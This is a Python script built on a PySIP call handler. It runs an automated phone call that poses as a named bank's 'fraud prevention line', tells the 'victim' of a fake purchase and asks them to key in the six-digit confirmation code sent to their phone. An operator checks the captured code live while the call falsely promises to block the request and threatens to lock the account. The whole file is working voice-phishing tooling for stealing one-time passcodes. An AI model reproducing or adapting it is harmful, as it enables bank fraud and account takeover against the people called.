import asyncio
from PySIP.call_handler import CallHandler


DELAY_ERR_MESSAGE = "We did no receive any input. Please enter the 6 digit confirmation code we have sent to your number"
DELAY_ERR_MESSAGE_2 = "Please press 1 if this was not you."


def typing_cb():
    print("Victim is Typing dtmf...")


async def bank_script(
    call_handler: CallHandler, bank_name: str, victim_name: str, code_length=6
):
    try:
        asyncio.create_task(call_handler.dtmf_handler.started_typing(typing_cb))
        # Phase 1
        await call_handler.say(f"Welcome to {bank_name} fraud prevention line")
        await call_handler.say(
            f"Hello {victim_name}, We have recently received an online purchase request from your {bank_name} account. If this was not you press 1"
        )
        dtmf_result = await call_handler.gather_and_say(delay_msg=DELAY_ERR_MESSAGE_2)
        print("The DTMF result is:-> ", dtmf_result)

        if not dtmf_result:
            await call_handler.sleep(1.5)
            await call_handler.hangup()
            return

        # Phase 2
        await call_handler.say(
            f"We need to confirm you identity before blocking this request. Please enter the {code_length} digit code we sent to your number."
        )

        attempts = 0
        max_attempts = 2

        while attempts < max_attempts:
            asyncio.create_task(call_handler.dtmf_handler.started_typing(typing_cb))
            dtmf_result = await call_handler.gather_and_say(
                length=code_length, delay=10, delay_msg=DELAY_ERR_MESSAGE
            )

            if dtmf_result:
                print("The DTMF result is:-> ", dtmf_result)
                entered_code = input("Is this code correct?: ")
                if entered_code == "1":
                    stream_id = await call_handler.say(
                        "Thank you for confirming your identity. The request will now be blocked."
                    )
                    await stream_id.wait_finished()
                    await call_handler.hangup()
                    print("Script BankOtp completed running Code validated.")

                else:
                    attempts += 1
                    if attempts == max_attempts:
                        stream = await call_handler.say(
                            "You have exceeded the maximum number of attempts. For security reasons, we will have to lock your account. Goodbye."
                        )
                        await stream.wait_finished()
                        await call_handler.hangup()
                        print("Script BankOtp failed due tp maximum attempts reached.")
                    else:
                        await call_handler.say(
                            "The code you entered is incorrect. Please try again."
                        )

            else:
                stream = await call_handler.say(
                    "No code entered. For security reasons, we will have to lock your account. Goodbye."
                )
                await stream.wait_finished()
                await call_handler.hangup()
                print("Script BankOtp failed due to no code entered.")

        print("Script BankOtp completed running..")

    except RuntimeError:
        print("The call is hanged up. Stopping the script...")
